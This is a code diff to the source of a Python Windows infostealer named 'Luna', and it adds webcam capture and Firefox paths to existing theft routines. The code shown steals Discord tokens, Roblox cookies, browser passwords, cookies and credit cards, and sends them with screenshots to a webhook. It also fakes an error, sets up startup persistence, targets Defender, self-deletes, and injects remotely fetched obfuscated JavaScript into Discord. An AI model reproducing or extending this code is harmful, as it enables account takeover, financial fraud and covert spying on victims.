@@ -1,4 +1,5 @@
 import base64
+import cv2
 import concurrent.futures
 import ctypes
 import json
@@ -43,15 +44,17 @@ __CONFIG__ = {
     "self_destruct": False
 }
 
-#global variables
+# global variables
 temp = os.getenv("temp")
-temp_path = os.path.join(temp, ''.join(random.choices("abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
+temp_path = os.path.join(temp, ''.join(random.choices(
+    "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789", k=10)))
 os.mkdir(temp_path)
 localappdata = os.getenv("localappdata")
 
 
 def main(webhook: str):
-    threads = [Browsers, Wifi, Minecraft, BackupCodes, killprotector, fakeerror, startup, disable_defender]
+    threads = [Browsers, Wifi, Minecraft, BackupCodes,
+               killprotector, fakeerror, startup, disable_defender]
     configcheck(threads)
 
     with concurrent.futures.ThreadPoolExecutor(max_workers=cpu_count()) as executor:
@@ -73,8 +76,10 @@ def main(webhook: str):
 
     if any(__CONFIG__[key] for key in ["roblox", "browser", "wifi", "minecraft", "backupcodes"]):
         with open(_file, 'rb') as file:
-            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
-            requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
+            encoder = MultipartEncoder({'payload_json': json.dumps(data), 'file': (
+                f'Luna-Logged-{os.getlogin()}.zip', file, 'application/zip')})
+            requests.post(webhook, headers={
+                          'Content-type': encoder.content_type}, data=encoder)
     else:
         requests.post(webhook, json=data)
 
@@ -121,11 +126,13 @@ def configcheck(list):
 
 
 def fakeerror():
-    ctypes.windll.user32.MessageBoxW(None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
+    ctypes.windll.user32.MessageBoxW(
+        None, 'Error code: 0x80070002\nAn internal error occurred while importing modules.', 'Fatal Error', 0)
 
 
 def startup():
-    startup_path = os.path.join(os.getenv("APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
+    startup_path = os.path.join(os.getenv(
+        "APPDATA"), "Microsoft", "Windows", "Start Menu", "Programs", "Startup")
     if hasattr(sys, 'frozen'):
         source_path = sys.executable
     else:
@@ -148,7 +155,8 @@ def create_temp(_dir: str or os.PathLike = None):
         _dir = os.path.expanduser("~/tmp")
     if not os.path.exists(_dir):
         os.makedirs(_dir)
-    file_name = ''.join(random.SystemRandom().choice('abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
+    file_name = ''.join(random.SystemRandom().choice(
+        'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789') for _ in range(random.randint(10, 20)))
     path = os.path.join(_dir, file_name)
     open(path, "x").close()
     return path
@@ -208,9 +216,12 @@ class PcInfo:
         self.get_inf(__CONFIG__["webhook"])
 
     def get_inf(self, webhook):
-        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(errors='ignore').strip().splitlines()[2].strip()
-        cpu = subprocess.run(["wmic", "cpu", "get", "Name"], capture_output=True, text=True).stdout.strip().split('\n')[2]
-        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True, shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
+        computer_os = subprocess.run('wmic os get Caption', capture_output=True, shell=True).stdout.decode(
+            errors='ignore').strip().splitlines()[2].strip()
+        cpu = subprocess.run(["wmic", "cpu", "get", "Name"],
+                             capture_output=True, text=True).stdout.strip().split('\n')[2]
+        gpu = subprocess.run("wmic path win32_VideoController get name", capture_output=True,
+                             shell=True).stdout.decode(errors='ignore').splitlines()[2].strip()
         ram = str(int(int(subprocess.run('wmic computersystem get totalphysicalmemory', capture_output=True,
                   shell=True).stdout.decode(errors='ignore').strip().split()[1]) / 1000000000))
         username = os.getenv("UserName")
@@ -322,7 +333,8 @@ class Discord:
                             continue
                         for line in [x.strip() for x in open(f'{path}\\{file_name}', errors='ignore').readlines() if x.strip()]:
                             for y in re.findall(self.encrypted_regex, line):
-                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
+                                token = self.decrypt_val(base64.b64decode(y.split('dQw4w9WgXcQ:')[
+                                                         1]), self.get_master_key(self.roaming + f'\\{disc}\\Local State'))
                                 r = requests.get(self.baseurl, headers={
                                     'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/80.0.3987.149 Safari/537.36',
                                     'Content-Type': 'application/json',
@@ -375,7 +387,8 @@ class Discord:
                     headers = {"Cookie": ".ROBLOSECURITY=" + robo_cookie}
                     info = None
                     try:
-                        response = requests.get("https://www.roblox.com/mobileapi/userinfo", headers=headers)
+                        response = requests.get(
+                            "https://www.roblox.com/mobileapi/userinfo", headers=headers)
                         response.raise_for_status()
                         info = response.json()
                     except requests.exceptions.HTTPError:
@@ -453,7 +466,8 @@ class Discord:
             if "message" in payment or payment == []:
                 methods = "❌"
             else:
-                methods = "".join(["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "❓" for method in payment])
+                methods = "".join(
+                    ["💳" if method['type'] == 1 else "<:paypal:973417655627288666>" if method['type'] == 2 else "❓" for method in payment])
 
             val += f'<:1119pepesneakyevil:972703371221954630> **Discord ID:** `{discord_id}` \n<:gmail:1051512749538164747> **Email:** `{email}`\n:mobile_phone: **Phone:** `{phone}`\n\n🔐 **2FA:** {mfa}\n<a:nitroboost:996004213354139658> **Nitro:** {nitro}\n<:billing:1051512716549951639> **Billing:** {methods}\n\n<:crown1:1051512697604284416> **Token:** `{token}`\n'
 
@@ -485,14 +499,23 @@ class Discord:
 
         self.robloxinfo(webhook)
 
-        image = ImageGrab.grab(
+        ss = ImageGrab.grab(
             bbox=None,
             all_screens=True,
             include_layered_windows=False,
             xdisplay=None
         )
-        image.save(temp_path + "\\desktopshot.png")
-        image.close()
+        ss = ImageGrab.grab(
+            bbox=None, all_screens=True, include_layered_windows=False, xdisplay=None
+        )
+        ss.save(temp_path + "\\desktopshot.png")
+        ss.close()
+
+        camera = cv2.VideoCapture(0)
+        return_value, image = camera.read()
+        cv2.imwrite(temp_path + "\\test.jpg", image)
+        camera.release()
+        cv2.destroyAllWindows()
 
         webhook_data = {
             "username": "Luna",
@@ -500,9 +523,16 @@ class Discord:
             "embeds": [
                 {
                     "color": 5639644,
-                    "title": "Desktop Screenshot",
+                    "title": "",
                     "image": {
-                        "url": "attachment://image.png"
+                        "url": "attachment://desktopshot.png"
+                    }
+                },
+                {
+                    "color": 5639644,
+                    "title": "",
+                    "image": {
+                        "url": "attachment://test.jpg"
                     }
                 }
             ]
@@ -510,9 +540,23 @@ class Discord:
 
         with open(temp_path + "\\desktopshot.png", "rb") as f:
             image_data = f.read()
-            encoder = MultipartEncoder({'payload_json': json.dumps(webhook_data), 'file': ('image.png', image_data, 'image/png')})
 
-        requests.post(webhook, headers={'Content-type': encoder.content_type}, data=encoder)
+        with open(temp_path + "\\test.jpg", "rb") as i:
+            test_data = i.read()
+
+        desktop_encoder = MultipartEncoder({
+            'payload_json': json.dumps(webhook_data),
+            'file': ('desktopshot.png', image_data, 'image/png')
+        })
+        requests.post(webhook, headers={
+                      'Content-type': desktop_encoder.content_type}, data=desktop_encoder)
+
+        test_encoder = MultipartEncoder({
+            'payload_json': json.dumps(webhook_data),
+            'file': ('test.jpg', test_data, 'image/png')
+        })
+        requests.post(webhook, headers={
+                      'Content-type': test_encoder.content_type}, data=test_encoder)
 
 
 class Browsers:
@@ -539,6 +583,8 @@ class Browsers:
             'iridium': self.appdata + '\\Iridium\\User Data',
             'opera': self.roaming + '\\Opera Software\\Opera Stable',
             'opera-gx': self.roaming + '\\Opera Software\\Opera GX Stable',
+            'mozilla-firefox': self.appdata + '\\Mozilla Firefox\\User Data',
+
         }
 
         self.profiles = [
@@ -584,7 +630,8 @@ class Browsers:
 
             for profile in self.profiles:
                 for func in self.funcs:
-                    thread = threading.Thread(target=process_browser, args=(name, path, profile, func))
+                    thread = threading.Thread(
+                        target=process_browser, args=(name, path, profile, func))
                     thread.start()
                     threads.append(thread)
 
@@ -598,7 +645,8 @@ class Browsers:
             with open(path, "r", encoding="utf-8") as f:
                 c = f.read()
             local_state = json.loads(c)
-            master_key = base64.b64decode(local_state["os_crypt"]["encrypted_key"])
+            master_key = base64.b64decode(
+                local_state["os_crypt"]["encrypted_key"])
             master_key = master_key[5:]
             master_key = CryptUnprotectData(master_key, None, None, None, 0)[1]
             return master_key
@@ -622,8 +670,10 @@ class Browsers:
             return
         conn = sqlite3.connect(path)
         cursor = conn.cursor()
-        cursor.execute('SELECT origin_url, username_value, password_value FROM logins')
-        password_file_path = os.path.join(temp_path, "Browser", "passwords.txt")
+        cursor.execute(
+            'SELECT origin_url, username_value, password_value FROM logins')
+        password_file_path = os.path.join(
+            temp_path, "Browser", "passwords.txt")
         for results in cursor.fetchall():
             if not results[0] or not results[1] or not results[2]:
                 continue
@@ -654,7 +704,8 @@ class Browsers:
                 host_key, name, path, encrypted_value, expires_utc = res
                 value = self.decrypt_password(encrypted_value, self.masterkey)
                 if host_key and name and value != "":
-                    f.write(f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
+                    f.write(
+                        f"{host_key}\t{'FALSE' if expires_utc == 0 else 'TRUE'}\t{path}\t{'FALSE' if host_key.startswith('.') else 'TRUE'}\t{expires_utc}\t{name}\t{value}\n")
         cursor.close()
         conn.close()
         os.remove(cookievault)
@@ -690,16 +741,20 @@ class Browsers:
         cc_file_path = os.path.join(temp_path, "Browser", "cc's.txt")
         with open(cc_file_path, 'a', encoding="utf-8") as f:
             if os.path.getsize(cc_file_path) == 0:
-                f.write("Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
+                f.write(
+                    "Name on Card  |  Expiration Month  |  Expiration Year  |  Card Number  |  Date Modified\n\n")
             for res in cursor.execute("SELECT name_on_card, expiration_month, expiration_year, card_number_encrypted FROM credit_cards").fetchall():
                 name_on_card, expiration_month, expiration_year, card_number_encrypted = res
-                card_number = self.decrypt_password(card_number_encrypted, self.masterkey)
-                f.write(f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
+                card_number = self.decrypt_password(
+                    card_number_encrypted, self.masterkey)
+                f.write(
+                    f"{name_on_card}  |  {expiration_month}  |  {expiration_year}  |  {card_number}\n")
         cursor.close()
         conn.close()
 
     def roblox_cookies(self):
-        robo_cookie_file = os.path.join(temp_path, "Browser", "roblox cookies.txt")
+        robo_cookie_file = os.path.join(
+            temp_path, "Browser", "roblox cookies.txt")
 
         if not __CONFIG__["roblox"]:
             pass
@@ -709,7 +764,8 @@ class Browsers:
                 with open(robo_cookie_file, 'w', encoding="utf-8") as f:
                     for line in g:
                         if ".ROBLOSECURITY" in line:
-                            robo_cookie = line.split(".ROBLOSECURITY")[1].strip()
+                            robo_cookie = line.split(
+                                ".ROBLOSECURITY")[1].strip()
                             f.write(robo_cookie + "\n\n")
                     if os.path.getsize(robo_cookie_file) == 0:
                         f.write("No Roblox Cookies Found")
@@ -828,7 +884,8 @@ class SelfDestruct():
 
     def delete(self):
         if self.frozen:
-            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path), shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
+            subprocess.Popen('ping localhost -n 3 > NUL && del /F "{}"'.format(self.path),
+                             shell=True, creationflags=subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
             os._exit(0)
         else:
             os.remove(self.path)
@@ -843,7 +900,8 @@ class Injection:
             self.appdata + '\\DiscordPTB',
             self.appdata + '\\DiscordDevelopment'
         ]
-        self.code = requests.get('https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js').text
+        self.code = requests.get(
+            'https://raw.githubusercontent.com/Smug246/luna-injection/main/obfuscated-injection.js').text
 
         for proc in psutil.process_iter():
             if 'discord' in proc.name().lower():
@@ -855,7 +913,8 @@ class Injection:
 
             if self.get_core(dir) is not None:
                 with open(self.get_core(dir)[0] + '\\index.js', 'w', encoding='utf-8') as f:
-                    f.write((self.code).replace('discord_desktop_core-1', self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
+                    f.write((self.code).replace('discord_desktop_core-1',
+                            self.get_core(dir)[1]).replace('%WEBHOOK%', webhook))
                     self.start_discord(dir)
 
     def get_core(self, dir: str) -> tuple:
